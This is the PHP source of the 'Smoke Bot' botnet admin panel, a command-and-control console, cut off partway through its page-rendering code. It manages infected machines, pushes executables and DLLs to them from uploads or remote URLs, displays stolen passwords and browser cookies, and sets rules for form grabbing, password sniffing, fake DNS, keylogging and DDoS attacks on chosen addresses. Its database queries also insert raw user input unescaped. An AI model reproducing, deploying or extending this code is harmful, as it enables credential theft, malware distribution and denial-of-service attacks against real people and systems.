<?php

$block_ip = array(
'8.30.234.',
'37.19.198.',
'67.217.160.',
'72.12.194.',
'80.219.36.',
'83.78.247.',
'84.17.52.',
'88.217.152.',
'89.167.131.',
'98.167.185.',
'102.129.143.',
'102.129.152.',
'102.129.153.',
'102.165.48.',
'138.199.10.',
'138.199.13.',
'143.215.130.',
'154.3.40.',
'154.3.42.',
'154.16.192.',
'154.29.131.',
'154.61.71.',
'156.146.36.',
'156.146.48.',
'156.146.62.',
'173.245.209.',
'176.10.99.',
'178.198.76.',
'178.199.49.',
'181.214.61.',
'185.220.101.',
'185.220.102.',
'185.220.103.',
'185.248.101.',
'186.77.196.',
'188.126.94.',
'191.96.150.',
'191.96.185.',
'191.96.227.',
'192.42.123.',
'192.87.28.',
'194.191.248.',
'195.181.175.',
'206.71.168.',
'212.102.36.',
'212.102.37.',
'216.131.75.',
'216.131.89.',
'216.131.111.',
'216.151.184.',
'69.55.5.'//или группа адресов
);
 
foreach($block_ip as $ip) {
    if(strstr($_SERVER["HTTP_X_FORWARDED_FOR"], $ip)) {
        die('Your IP blocked');
    }
}


//error_reporting(E_ALL|E_STRICT);
//ini_set("display_errors","On");
header("Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline'; img-src 'self' data:; script-src 'self' 'unsafe-inline'");
@set_time_limit(0);
@ini_set("max_execution_time", 0);
session_start();
require_once "./inc/cfg.php";
require_once "./inc/geoip.inc";
require_once "./inc/funcs.php";
require_once "./inc/style.php";

global $STEALER,$dbcon;
mysql_init();

$page = isset($_GET["page"]) ? $_GET["page"] : "";
$act = isset($_GET["act"]) ? $_GET["act"] : "";
$id = isset($_GET["id"]) ? $_GET["id"] : "";
$fileid = isset($_GET["file"]) ? $_GET["file"] : "";
$next = isset($_GET["next"]) ? $_GET["next"] : "";
$opt = isset($_GET["opt"]) ? $_GET["opt"] : "";
$_GET["mode"] = isset($_GET["mode"]) ? $_GET["mode"] : "";
$error = "";
$ddos_state = false;
$htv_state = false;

$referrer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
$control = $config["cpname"];

$auth_mode = $config["auth"];
switch ($auth_mode){
	case 0:
		$sapi_name = php_sapi_name();
		if ($sapi_name === "cgi" || $sapi_name === "cgi-fcgi") list($_SERVER["PHP_AUTH_USER"],$_SERVER["PHP_AUTH_PW"]) = explode(":",base64_decode(substr($_SERVER["REDIRECT_REMOTE_USER"],6)));
		if (!isset($_SERVER["PHP_AUTH_USER"]) || $_SERVER["PHP_AUTH_USER"] !== $config["admin"] || $_SERVER["PHP_AUTH_PW"] !== $config["pass"]){
			header("WWW-Authenticate: Basic");
			if ($sapi_name === "cgi" || $sapi_name === "cgi-fcgi")	header("Status: 401 Unauthorized"); else header($_SERVER["SERVER_PROTOCOL"]." 401 Unauthorized");
			exit;
		}
		break;
	case 1:
		if (isset($_POST["auth_enter"]) && $_POST["auth_enter"] == 1 && !isset($_SESSION["allow_login"])){
			if ($_POST["auth_login"] === $config["admin"] && $_POST["auth_pass"] === $config["pass"]) $_SESSION["allow_login"] = true;
		}
		if (!isset($_SESSION["allow_login"])){
			?>
			<hmtl><head></head><body>
			<form method="POST">
				Login: <input type="input" name="auth_login" value="">
				Password: <input type="input" name="auth_pass" value="">
				<input type="hidden" name="auth_enter" value="1">
				<input type="submit" value="Enter"> 
			</form>
			</body></html>
			<?php
			exit;
		}
		break;
}

//search bots
if (isset($_POST["mode"]) && $_POST["mode"] === "search"){
	mysqli_query($dbcon,"UPDATE `options` SET `bot_search`=''");
	$htv_state_search = false;
	if (isset($_POST["sr_htv"])) $htv_state_search = true;
	$id_pattern = $_POST["sr_pattern"];
	$geo_pattern = $_POST["sr_geo"];
	$sel_pattern = $_POST["sr_seller"];
	$ip_pattern = $_POST["sr_ip"];
	$r = mysqli_query($dbcon,"SELECT * FROM `bots` ORDER BY `time` DESC");
	$out = "";
	while ($v = mysqli_fetch_assoc($r)){
		if ((stripos($v["cname"],$id_pattern) !== false) || (stripos($v["country"],$geo_pattern) === 0) || (stripos($v["seller"],$sel_pattern) !== false) || (stripos($v["proxyip"],$ip_pattern) !== false)){
			$color = "";
			if ($v["bits"] == 0) $bits = "x32"; else $bits = "x64";
			if ($v["privs"] == 0) $isadmin = "Medium+"; else $isadmin = "Low";
			if ($v["personal"] == 0) $personal = "Set"; else $personal = "Edit";
			if ($v["delete"] == 0) $state = "<a class=\"action\" href=\"?act=remove&id={$v["id"]}\">Delete</a>"; else $state = "<a class=\"action\" href=\"?act=removecancel&id={$v["id"]}\">On delete</a>";
			if ($v["time"] > time()-$config["interval"]) $color = "style=\"background-color:#caffc9\"";
			if ($v["ban"] == 0) $isban = "<a class=\"action\" href=\"?act=ban&id={$v["id"]}\">Ban</a>"; else {$color = "style=\"background-color:#ff8080;\""; $isban = "<a class=\"action\" href=\"?act=unban&id={$v["id"]}\">Unban</a>";}
			$htv = "";
			$htv_enable = "";
			if ($htv_state_search){
				if ($v["hget"] == 0) $htv_enable = " | <a class=\"action\" href=\"?act=gethtv&id={$v["id"]}\">GET RPC</a>"; else $htv_enable = " | <a class=\"action\" href=\"?act=delhtv&id={$v["id"]}\">RPC IDLE</a>";
				$htv_id = "-";
				$htv_pass = "-";
				if ($v["htime"] > time()-$config["interval"]){
					if (!empty($v["hid"]) && !empty($v["hpass"])){
						$htv_id = $v["hid"];
						$htv_pass = $v["hpass"];
					}
				}
				$htv = "<td align=\"center\"><div style=\"text-transform:none;\">{$htv_id}</div></td><td align=\"center\"><div style=\"text-transform:none;\">{$htv_pass}</div></td>";
			}
			$out .= "<tr class=\"blank\" {$color}><td align=\"center\">{$v["cname"]}</td><td align=\"center\">{$v["ip"]}</td><td align=\"center\">{$v["proxyip"]}</td><td align=\"center\">{$v["comp"]}</td>";
			$out .= "<td align=\"center\"><div class=\"os{$v["os"]}png\"></div> - {$bits}</td><td align=\"center\">".date("d.m.Y H:i:s",$v["time"])."</td><td align=\"center\"><div class=\"".strtolower($v["country"])."gif\"></div> {$v["country"]}</td><td align=\"center\"><div style=\"text-transform:none;\">{$v["seller"]}</div></td><td align=\"center\">{$isadmin}</td>{$htv}<td align=\"center\"><a class=\"action\" href=\"#\" onclick=\"showdiv('personal',{$v["id"]}); return false\">{$personal}</a> | {$state} | {$isban}{$htv_enable}</td></tr>";
		}
	}
	$out = base64_encode($out);
	mysqli_query($dbcon,"UPDATE `options` SET `bot_search`='{$out}'");
	die(header("Location: {$control}?page=bots&mode=search"));
}
//formgrabber filters
if (isset($_POST["mode"]) && $_POST["mode"] === "fgfilter_save"){
	$filter = $_POST["fgfilter"];
	mysqli_query($dbcon,"UPDATE `plugins` SET `fgfilter`='{$filter}'");
	die(header("Location: {$referrer}"));
}
//formgrabber cookies
if (isset($_POST["mode"]) && $_POST["mode"] === "fgcookies_save"){
	if (isset($_POST["fgcookies"])) $type = $_POST["fgcookies"]; else $type = "0";
	if ($type === "1") mysqli_query($dbcon,"UPDATE `plugins` SET `fgcookies`=1"); else mysqli_query($dbcon,"UPDATE `plugins` SET `fgcookies`=0");
	die(header("Location: {$referrer}"));
}
//options links
if (!empty($opt)){
	switch ($opt){
		case "delexe":
			//delete all tasks with local files
			$req = mysqli_query($dbcon,"SELECT * FROM `tasks`");
			while ($res = mysqli_fetch_assoc($req)) @unlink("./exe/{$res["id"]}.tmp");
			mysqli_query($dbcon,"TRUNCATE TABLE `tasks`");
			break;
		case "delpers":
			//delete all personal tasks with local files
			$req = mysqli_query($dbcon,"SELECT * FROM `personal`");
			while ($res = mysqli_fetch_assoc($req)) @unlink("./exe/p{$res["botid"]}.tmp");
			mysqli_query($dbcon,"TRUNCATE TABLE `personal`");
			mysqli_query($dbcon,"UPDATE `bots` SET `personal`=0");
			break;
		case "delstat":
			//clear all stats and clear tasks counters
			mysqli_query($dbcon,"TRUNCATE TABLE `bots`");
			mysqli_query($dbcon,"UPDATE `tasks` SET `loads`=0");
			mysqli_query($dbcon,"UPDATE `tasks` SET `runs`=0");
			break;
		case "delupdate":
			//clear update flag and delete update files
			mysqli_query($dbcon,"UPDATE `options` SET `upd`=''");
			mysqli_query($dbcon,"UPDATE `bots` SET `upd`=0");
			@unlink("./exe/update.exe");
			break;
		case "delreports":
			//delete all form grabber reports
			mysqli_query($dbcon,"TRUNCATE TABLE `formgrab`");
			break;
		case "delftps":
			//delete all pass sniffer reports
			mysqli_query($dbcon,"TRUNCATE TABLE `ftpgrab`");
			break;
		case "delemails":
			//delete all email grabber reports
			mysqli_query($dbcon,"TRUNCATE TABLE `emailgrab`");
			break;
	}
	die(header("Location: {$referrer}"));
}
//ddos funcs
if (isset($_POST["mode"]) && $_POST["mode"] === "ddos" && !empty($_POST["ddosmode"]) && !empty($_POST["address"])){
	$mode = (int)get_mode($_POST["ddosmode"]);
	$addr = $_POST["address"];
	if ($mode <> 8){
		$arr1 = array(0,1,2,7);
		$arr2 = array(3,4,5);
		if (in_array($mode,$arr1)){
			if (strpos($addr,"http:") !== 0) die(header("Location: {$referrer}"));
		} elseif ($mode == 6){
			if (strpos($addr,"https:") !== 0) die(header("Location: {$referrer}"));
		} elseif (in_array($mode,$arr2)){
			if ((strpos($addr,"http:") === 0) || (strpos($addr,"https:") === 0)) die(header("Location: {$referrer}"));
		}
		mysqli_query($dbcon,"INSERT INTO `ddos` (`mode`,`url`) VALUES ('{$mode}','{$addr}')");
		mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
	}
	SetDDoSRules();
	die(header("Location: {$referrer}"));
}
//procmon funcs
if (isset($_POST["procmon"]) && $_POST["procmon"] === "yes"){
	$proc = strtolower($_POST["process"]);
	$type = $_POST["type"];
	$comment = $_POST["comment"];
	$url = $_POST["url"];
		if ($type === "0" && !empty($_FILES["file"]["name"]) && !empty($proc)){
			mysqli_query($dbcon,"INSERT INTO `procmon` (`process`,`type`,`time`,`success`,`url`,`comment`) VALUES ('{$proc}','{$type}',".time().",0,'0','{$comment}')");
			$id = mysqli_insert_id($dbcon);
			move_uploaded_file($_FILES["file"]["tmp_name"],"./exe/pm_{$id}.tmp");
		} elseif ($type === "0" && !empty($url)) mysqli_query($dbcon,"INSERT INTO `procmon` (`process`,`type`,`time`,`success`,`url`,`comment`) VALUES ('{$proc}','{$type}',".time().",0,'{$url}','{$comment}')"); elseif ($type === "1" || $type === "2") mysqli_query($dbcon,"INSERT INTO `procmon` (`process`,`type`,`time`,`success`,`url`,`comment`) VALUES ('{$proc}','{$type}',".time().",0,'0','{$comment}')");
	SetPMRules();
	die(header("Location: {$referrer}"));
}
//task edit
if (isset($_POST["edit"]) && $_POST["edit"] === "yes"){
	$id = $_POST["id"];
	$geo = $_POST["geo"];
	$geo = strtolower($geo);
	$limit = $_POST["limit"];
	$seller = $_POST["seller"];
	$isdll = $_POST["start"];
	$bits = $_POST["bits"];
	$delafter = isset($_POST["delafter"]) ? $_POST["delafter"] : "0";
	if (empty($geo)) $geo = "all";
	if (empty($seller)) $seller = "0";
	if (!empty($_FILES["file"]["name"])){
		//if (!isencrypted($_FILES["file"]["tmp_name"])) die("Task not encrypted. Read readme.txt");
		mysqli_query($dbcon,"UPDATE `tasks` SET `time`=".time().",`from`='',`seller`='{$seller}',`limit`={$limit},`country`='{$geo}',`isdll`='{$isdll}',`bits`='{$bits}',`delafter`='{$delafter}' WHERE `id`={$id}");
		$filepath = "./exe/{$id}.tmp";
		@unlink($filepath);
		move_uploaded_file($_FILES["file"]["tmp_name"],$filepath);
		//encrypt PE file
		encryptfile($filepath);
	}
	die(header("Location: {$control}?page=tasks"));
} elseif (isset($_POST["edit"]) && $_POST["edit"] === "remote"){
	$id = $_POST["id"];
	$from = $_POST["url"];
	$geo = $_POST["geo"];
	$geo = strtolower($geo);
	$limit = $_POST["limit"];
	$seller = $_POST["seller"];
	$isdll = $_POST["start"];
	$bits = $_POST["bits"];
	$delafter = isset($_POST["delafter"]) ? $_POST["delafter"] : "0";
	if (empty($geo)) $geo = "all";
	if (empty($seller)) $seller = "0";
	if (!empty($from)){
		mysqli_query($dbcon,"UPDATE `tasks` SET `time`=".time().",`from`='{$from}',`seller`='{$seller}',`limit`={$limit},`country`='{$geo}',`isdll`='{$isdll}',`bits`='{$bits}',`delafter`='{$delafter}' WHERE `id`={$id}");
		@unlink("./exe/{$id}.tmp");
	}
	die(header("Location: {$control}?page=tasks"));
}
//some other shit
if (!empty($_FILES["updname"]["name"])){
	mysqli_query($dbcon,"UPDATE `bots` SET `upd`=1");
	@unlink("./exe/update.exe");
	mysqli_query($dbcon,"UPDATE `options` SET `upd`='local'");
	move_uploaded_file($_FILES["updname"]["tmp_name"],"./exe/update.exe");
	//encrypt PE file
	encryptfile("./exe/update.exe");
	die(header("Location: {$referrer}"));
} elseif (!empty($_POST["update"])){
	$url = $_POST["update"];
	mysqli_query($dbcon,"UPDATE `bots` SET `upd`=1");
	mysqli_query($dbcon,"UPDATE `options` SET `upd`='{$url}'");
	die(header("Location: {$referrer}"));
} elseif (isset($_POST["rules"])){
	$rules = $_POST["rules"];
	mysqli_query($dbcon,"UPDATE `plugins` SET `fakedns_rules`='{$rules}'");
	die(header("Location: {$referrer}"));
} elseif (isset($_POST["frules"])){
	$rules = $_POST["frules"];
	mysqli_query($dbcon,"UPDATE `plugins` SET `filesearch_rules`='{$rules}'");
	mysqli_query($dbcon,"UPDATE `bots` SET `fsearch`=0");
	die(header("Location: {$referrer}"));
} elseif (isset($_POST["klrules"])){
	$rules = $_POST["klrules"];
	mysqli_query($dbcon,"UPDATE `plugins` SET `keylog_rules`='{$rules}'");
	die(header("Location: {$referrer}"));
}
//personal task
if (!empty($_FILES["file"]["name"]) && !empty($_POST["botid"])){
	$botid = $_POST["botid"];
	$task = "local";
	$isdll = $_POST["start"];
	mysqli_query($dbcon,"UPDATE `bots` SET `personal`=1 WHERE `id`={$botid}");
	mysqli_query($dbcon,"INSERT INTO `personal` (`botid`,`task`,`isdll`) VALUES ({$botid},'{$task}','{$isdll}') ON DUPLICATE KEY UPDATE task='{$task}',isdll='{$isdll}'");
	$filepath = "./exe/p{$botid}.tmp";
	@unlink($filepath);
	move_uploaded_file($_FILES["file"]["tmp_name"],$filepath);
	//encrypt PE file
	encryptfile($filepath);
	die(header("Location: {$referrer}"));
}elseif (!empty($_POST["url"]) && !empty($_POST["botid"])){
	$botid = $_POST["botid"];
	$task = $_POST["url"];
	$isdll = $_POST["start"];
	mysqli_query($dbcon,"UPDATE `bots` SET `personal`=1 WHERE `id`={$botid}");
	mysqli_query($dbcon,"INSERT INTO `personal` (`botid`,`task`,`isdll`) VALUES ({$botid},'{$task}','{$isdll}') ON DUPLICATE KEY UPDATE task='{$task}',isdll='{$isdll}'");
	die(header("Location: {$referrer}"));
}
//global task
if (!empty($_FILES["file"]["name"]) && empty($_POST["botid"])){
	$comment = $_POST["comment"];
	$geo = $_POST["geo"];
	$geo = strtolower($geo);
	$limit = $_POST["limit"];
	$seller = $_POST["seller"];
	$isdll = $_POST["start"];
	$bits = $_POST["bits"];
	$delafter = isset($_POST["delafter"]) ? $_POST["delafter"] : "0";
	if (empty($geo)) $geo = "all";
	mysqli_query($dbcon,"INSERT INTO `tasks` (`seller`,`comment`,`from`,`loads`,`runs`,`limit`,`country`,`time`,`isdll`,`bits`,`delafter`) VALUES ('{$seller}','{$comment}','',0,0,{$limit},'{$geo}','".time()."','{$isdll}','{$bits}','{$delafter}')");
	$id = mysqli_insert_id($dbcon);
	move_uploaded_file($_FILES["file"]["tmp_name"],"./exe/{$id}.tmp");
	//encrypt PE file
	encryptfile("./exe/{$id}.tmp");
	die(header("Location: {$referrer}"));
} elseif (!empty($_POST["url"]) && empty($_POST["botid"])){
	$comment = $_POST["comment"];
	$from = $_POST["url"];
	$geo = $_POST["geo"];
	$geo = strtolower($geo);
	$limit = $_POST["limit"];
	$seller = $_POST["seller"];
	$isdll = $_POST["start"];
	$bits = $_POST["bits"];
	$delafter = isset($_POST["delafter"]) ? $_POST["delafter"] : "0";
	if (empty($geo)) $geo = "all";
	mysqli_query($dbcon,"INSERT INTO `tasks` (`seller`,`comment`,`from`,`loads`,`runs`,`limit`,`country`,`time`,`isdll`,`bits`,`delafter`) VALUES ('{$seller}','{$comment}','{$from}',0,0,{$limit},'{$geo}','".time()."','{$isdll}','{$bits}','{$delafter}')");
	die(header("Location: {$referrer}"));
}
//action routine
if (!empty($act)){
	if ($act !== "edit"){
		switch ($act){
			case "del":
				if (!empty($id)){
					mysqli_query($dbcon,"DELETE FROM `tasks` WHERE `id`={$id}");
					@unlink("./exe/{$id}.tmp");
				}
				break;
			case "stop":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `tasks` SET `stop`='1' WHERE `id`={$id}");
				break;
			case "resume":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `tasks` SET `stop`='0' WHERE `id`={$id}");
				break;
			case "showlog":
				if (!empty($id)){
					$out = "";
					$r = mysqli_query($dbcon,"SELECT * FROM `stealer` WHERE `cname`='{$id}' AND `host`<>'COOKIES'");
					while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["cname"]} | ".date("d.m.Y H:i:s",$v["time"])." | {$STEALER[$v["softid"]]} | {$v["host"]} | {$v["user"]} | {$v["pass"]}\r\n";
					header('Content-type:text/plain');
					die($out);
				}
				break;
			case "showcookies":
				if (!empty($id)){
					$out = "";
					$r = mysqli_query($dbcon,"SELECT * FROM `stealer` WHERE `cname`='{$id}' AND `host`='COOKIES'");
					while ($v = mysqli_fetch_assoc($r)) $out.= ("#{$v["cname"]} | ".date("d.m.Y H:i:s",$v["time"])." | {$STEALER[$v["softid"]]}\r\n\r\n{$v["pass"]}\r\n");
					header('Content-type:text/plain');
					die($out);
				}
				break;
			case "showalllog":
				$out = "";
				$r = mysqli_query($dbcon,"SELECT * FROM `stealer` WHERE `host`<>'COOKIES'");
				while ($v = mysqli_fetch_assoc($r)) $out.= "{$v["cname"]} | ".date("d.m.Y H:i:s",$v["time"])." | {$STEALER[$v["softid"]]} | {$v["host"]} | {$v["user"]} | {$v["pass"]}\r\n";
				header('Content-type:text/plain');
				die($out);
				break;
			case "exportlogs":
				header('Content-type:text/plain');
				exportlogs();
				die ("Export done. Check /files/!stealer folder.\r\n");
				break;
			case "dellog":
				if (!empty($id)) mysqli_query($dbcon,"DELETE FROM `stealer` WHERE `cname`='{$id}'");
				break;
			case "delalllog":
				mysqli_query($dbcon,"TRUNCATE TABLE `stealer`");
				break;
			case "remove":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `delete`='1' WHERE `id`={$id}");
				break;
			case "removecancel":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `delete`='0' WHERE `id`={$id}");
				break;
			case "delbots":
				mysqli_query($dbcon,"UPDATE `bots` SET `delete`='1'");
				break;
			case "canceldelbots":
				mysqli_query($dbcon,"UPDATE `bots` SET `delete`='0'");
				break;
			case "ban":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `ban`='1' WHERE `id`={$id}");
				break;
			case "unban":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `ban`='0' WHERE `id`={$id}");
				break;
			case "gethtv":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `hget`='1' WHERE `id`={$id}");
				break;
			case "delhtv":
				if (!empty($id)) mysqli_query($dbcon,"UPDATE `bots` SET `hget`='0' WHERE `id`={$id}");
				break;
			case "pm_del":
				if (!empty($id)){
					mysqli_query($dbcon,"DELETE FROM `procmon` WHERE `id`={$id}");
					@unlink("./exe/pm_{$id}.tmp");
					SetPMRules();
				}
				break;
			case "pm_stop":
				if (!empty($id)){
					mysqli_query($dbcon,"UPDATE `procmon` SET `stop`='1' WHERE `id`={$id}");
					SetPMRules();
				}
				break;
			case "pm_resume":
				if (!empty($id)){
					mysqli_query($dbcon,"UPDATE `procmon` SET `stop`='0' WHERE `id`={$id}");
					SetPMRules();
				}
				break;
			case "ddosdel":
				if (!empty($id)){
					mysqli_query($dbcon,"DELETE FROM `ddos` WHERE `id`={$id}");
					mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
					SetDDoSRules();
				}
				break;
			case "ddosstop":
				if (!empty($id)){
					mysqli_query($dbcon,"UPDATE `ddos` SET `state`=1 WHERE `id`={$id}");
					mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
					SetDDoSRules();
				}
				break;
			case "ddosresume":
				if (!empty($id)){
					mysqli_query($dbcon,"UPDATE `ddos` SET `state`=0 WHERE `id`={$id}");
					mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
					SetDDoSRules();
				}
				break;
			case "ddosstopall":
				mysqli_query($dbcon,"UPDATE `ddos` SET `state`=1");
				mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
				SetDDoSRules();
				break;
			case "ddosresumeall":
				mysqli_query($dbcon,"UPDATE `ddos` SET `state`=0");
				mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
				SetDDoSRules();
				break;
			case "ddosdelall":
				mysqli_query($dbcon,"TRUNCATE TABLE `ddos`");
				mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0");
				SetDDoSRules();
				break;
		}
		die(header("Location: {$referrer}"));
	}
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>SMOKE BOT - ADMIN PANEL</title>
<style><?php css(); ?></style>
<script>
function look(type){param = document.getElementById(type);if(param.style.display == "none") param.style.display = "block";else param.style.display = "none"}

function showdiv(id,param){
	document.getElementById("botid_num1").value = param;
	document.getElementById("botid_num2").value = param;
	if (document.getElementById(id).style.display == "none") document.getElementById(id).style.display = "block";else document.getElementById(id).style.display = "none";
}
</script>
</head>
<body>
<div id="main">
		<div id="menu">
			<ul>
				<li><a href="?page=index"> MY BOTNET </a></li>
				<li><a href="?page=bots"> BOT LIST </a></li>
				<li><a href="?page=tasks"> TASK LIST </a></li>
				<li><a href="?page=options"> OPTIONS </a></li>
				<li><a href="?page=domen"> DOMEN CHANGE </a></li>
		<?php
			global $plugins;
			$menu = "";
			$status = getpluginssize("./mods/plugins");
			if ($status == 1){
				$hash = getpluginshash();
				mysqli_query($dbcon,"UPDATE `plugins` SET `hash`='{$hash}'");
				$enc = getplugins("./mods/plugins");
				$plugins[0] = (($enc&0x01) == 0x01);
				$plugins[1] = (($enc&0x02) == 0x02);
				//$plugins[2] = (($enc&0x04) == 0x04);
				$plugins[3] = (($enc&0x08) == 0x08);
				$plugins[5] = (($enc&0x0100) == 0x0100);
				$plugins[6] = (($enc&0x0200) == 0x0200);
				$plugins[7] = (($enc&0x0400) == 0x0400);
				$plugins[9] = (($enc&0x0800) == 0x0800);
				$plugins[11] = (($enc&0x010000) == 0x010000);
				$plugins[12] = (($enc&0x020000) == 0x020000);
				$plugins[13] = (($enc&0x040000) == 0x040000);
				if ($plugins[0]) $menu .= "<li><a href=\"?page=stealer\"> STEALER </a></li>";
				if ($plugins[1]) $menu .= "<li><a href=\"?page=procmon\"> PROCMON </a></li>";
				//if ($plugins[2]) $menu .= "<li><a href=\"?page=#\"> EMPTY </a></li>";
				if ($plugins[3]) $menu .= "<li><a href=\"?page=egrab\"> EMAIL GRAB </a></li>";
				if ($plugins[5]) $menu .= "<li><a href=\"?page=fgrab\"> FORM GRAB </a></li>";
				if ($plugins[6]) $menu .= "<li><a href=\"?page=passsnif\"> PASS SNIF </a></li>";
				if ($plugins[7]) $menu .= "<li><a href=\"?page=fakedns\"> FAKE DNS </a></li>";
				if ($plugins[9]) $menu .= "<li><a href=\"?page=filesearch\"> FILE SEARCH </a></li>";
				if ($plugins[11]) {$menu .= "<li><a href=\"?page=ddos\"> DDOS </a></li>";$ddos_state = true;}
				if ($plugins[12]) $menu .= "<li><a href=\"?page=keylog\"> KEYLOGGER </a></li>";
				if ($plugins[13]) $htv_state = true;
			} elseif ($status == 2) $error = "<li><b>plugins file is corrupted</b>, reupload it to \"/mods/\" folder (don\'t use FileZilla)</li>";
			echo $menu;
		?>
			</ul>
			<div id="status">SMOKE BOT | rev. 03/2020<br><br><?php echo "EKEY: ".sprintf("0x%08X",encryptkey)."<br>DKEY: ".sprintf("0x%08X",decryptkey)."<br><br>SERVER: ".$_SERVER["SERVER_ADDR"]."<br>DATE: ".date("d.m.Y",time())."<br>TIME: ".date("H:i:s",time())."<br><br>PHP: ".get_php_ver()."<br>MYSQL: ".mysqli_get_server_version($dbcon)?></div>
		</div>
		<div id="data">
<?php
if ($act === "edit" && !empty($id)){
	$checked1 = "";
	$checked2 = "";
	$checked3 = "";
	$checked4 = "";
	$checked5 = "";
	$checked6 = "";
	$checked7 = "";
	$checked8 = "";
	$checked9 = "";
	$v = mysqli_query($dbcon,"SELECT * FROM `tasks` WHERE `id`={$id}");
	$load = mysqli_fetch_assoc($v);
	if ($load["isdll"] == 0) $checked1 = "checked";
	if ($load["isdll"] == 1) $checked2 = "checked";
	if ($load["isdll"] == 2) $checked3 = "checked";
	if ($load["isdll"] == 3) $checked4 = "checked";
	if ($load["isdll"] == 4) $checked9 = "checked";
	if ($load["bits"] == 0) $checked5 = "checked";
	if ($load["bits"] == 1) $checked6 = "checked";
	if ($load["bits"] == 2) $checked7 = "checked";
	if ($load["delafter"]==1) $checked8 = "checked";
	echo "
	<table id=\"task\">
		<tr>
			<th align=\"center\">Edit task with ID#{$id}</th>
		</tr>
		<tr>
			<th align=\"center\">Local file</th>
		</tr>
		<tr>
			<td align=\"left\">
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					<input type=\"hidden\" name=\"edit\" value=\"yes\">
					<input type=\"hidden\" name=\"id\" value=\"{$id}\">
					GEO: <input type=\"input\" name=\"geo\" value=\"{$load["country"]}\"><br>(for allow: ru,us,gb; for deny RU: all,!ru)<br><br>
					Limit: <input type=\"input\" name=\"limit\" value=\"{$load["limit"]}\" size=\"8\" maxlength=\"7\"> Seller: <input type=\"input\" name=\"seller\" value=\"{$load["seller"]}\" size=\"8\" maxlength=\"5\"><br><br>
					<input type=\"file\" name=\"file\">
					<input type=\"submit\" value=\"UPLOAD\"><br><br>
						<table cols=\"5\" width=\"400px\">Options:
							<tr>
								<td><input type=\"radio\" name=\"start\" value=\"0\" {$checked1}>RunEXE</td>
								<td><input type=\"radio\" name=\"start\" value=\"1\" {$checked2}>LoadDLL</td>
								<td><input type=\"radio\" name=\"start\" value=\"2\" {$checked3}>regsvr32</td>
								<td><input type=\"radio\" name=\"start\" value=\"3\" {$checked4}>RunMEM</td>
								<td><input type=\"radio\" name=\"start\" value=\"4\" {$checked9}>RunBAT</td>
							</tr>
							<tr>
								<td><input type=\"radio\" name=\"bits\" value=\"0\" {$checked5}>x32 & x64</td>
								<td><input type=\"radio\" name=\"bits\" value=\"1\" {$checked6}>x32</td>
								<td><input type=\"radio\" name=\"bits\" value=\"2\" {$checked7}>x64</td>
								<td></td
								<td></td>
							</tr>
							<tr>
								<td colspan=\"5\"><input type=\"checkbox\" name=\"delafter\" value=\"1\" {$checked8}>Delete bot after complete tasks</td>
							</tr>
						</table>
				</form>
			</td>
		</tr>
		<tr>
			<th align=\"center\">Remote file</th>
		</tr>
		<tr>
			<td align=\"left\">
				<form method=\"post\" enctype=\"multipart/form-data\" action=\"\">
					<input type=\"hidden\" name=\"edit\" value=\"remote\">
					<input type=\"hidden\" name=\"id\" value=\"{$id}\">
					GEO: <input type=\"input\" name=\"geo\" value=\"{$load["country"]}\"> <br>(for allow: ru,us,gb; for deny RU: all,!ru)<br><br>
					Limit: <input type=\"input\" name=\"limit\" value=\"{$load["limit"]}\" size=\"8\" maxlength=\"7\"> Seller: <input type=\"input\" name=\"seller\" value=\"{$load["seller"]}\" size=\"8\" maxlength=\"5\"><br><br>
					URL: <input type=\"input\" name=\"url\" value=\"{$load["from"]}\">
					<input type=\"submit\" value=\"SET\"><br><br>
						<table cols=\"5\" width=\"400px\">Options:
							<tr>
								<td><input type=\"radio\" name=\"start\" value=\"0\" {$checked1}>RunEXE</td>
								<td><input type=\"radio\" name=\"start\" value=\"1\" {$checked2}>LoadDLL</td>
								<td><input type=\"radio\" name=\"start\" value=\"2\" {$checked3}>regsvr32</td>
								<td><input type=\"radio\" name=\"start\" value=\"3\" {$checked4}>RunMEM</td>
								<td><input type=\"radio\" name=\"start\" value=\"4\" {$checked9}>RunBAT</td>
							</tr>
							<tr>
								<td><input type=\"radio\" name=\"bits\" value=\"0\" {$checked5}>x32 & x64</td>
								<td><input type=\"radio\" name=\"bits\" value=\"1\" {$checked6}>x32</td>
								<td><input type=\"radio\" name=\"bits\" value=\"2\" {$checked7}>x64</td>
								<td></td
								<td></td>
							</tr>
							<tr>
								<td colspan=\"5\"><input type=\"checkbox\" name=\"delafter\" value=\"1\" {$checked8}>Delete bot after complete tasks</td>
							</tr>
						</table>
				</form>
			</td>
		</tr>
	</table>";
} else {
if(empty($page) || $page === "index"){
	if (file_exists("./install.php")) $error .= "<li>delete \"install.php\" file</li>";
	if (!check_install()) $error .= "<li>panel not installed properly, use \"install.php\"</li>";
	if (!check_geoip()) $error .= "<li>geoip file seems corrupted, reupload \"/inc/geoip\"</li>";
	if (file_exists("./control.php")) $error .= "<li>rename \"control.php\" file and edit \"/inc/cfg.php\" file</li>";
	if (file_exists("./guest.php")) $error .= "<li>rename \"guest.php\" file and edit \"/inc/cfg.php\" file</li>";
	if (!is_writable("./exe/")) $error .= "<li>set chmod 0777 for \"exe\" folder</li>";
	if (!is_writable("./files/")) $error .= "<li>set chmod 0777 for \"files\" folder</li>";
	if (!is_writable("./keylogger/")) $error .= "<li>set chmod 0777 for \"keylogger\" folder</li>";
